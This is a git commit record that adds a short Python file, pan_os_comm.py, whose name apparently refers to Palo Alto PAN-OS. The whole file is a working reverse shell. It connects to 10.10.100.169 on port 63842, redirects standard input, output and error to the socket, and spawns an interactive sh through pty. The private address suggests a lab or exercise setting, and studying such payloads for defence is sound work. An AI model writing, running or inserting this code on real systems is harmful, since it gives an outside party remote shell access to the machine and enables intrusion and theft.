c561c59b4a0754284dd09c5ad75c017f22fc7c67
INFINIT3I <38301254+Infinit3i@users.noreply.github.com>
2025-05-08 11:52:36 -0400

    Create pan_os_comm.py

---
+++ pan_os_comm.py
@@ -0,0 +1,18 @@
+#!/usr/bin/env python3
+
+import socket
+import subprocess
+import os
+import pty
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect(("10.10.100.169", 63842))
+
+os.dup2(s.fileno(), 0)
+
+os.dup2(s.fileno(), 1)
+
+os.dup2(s.fileno(), 2)
+
+pty.spawn("sh")
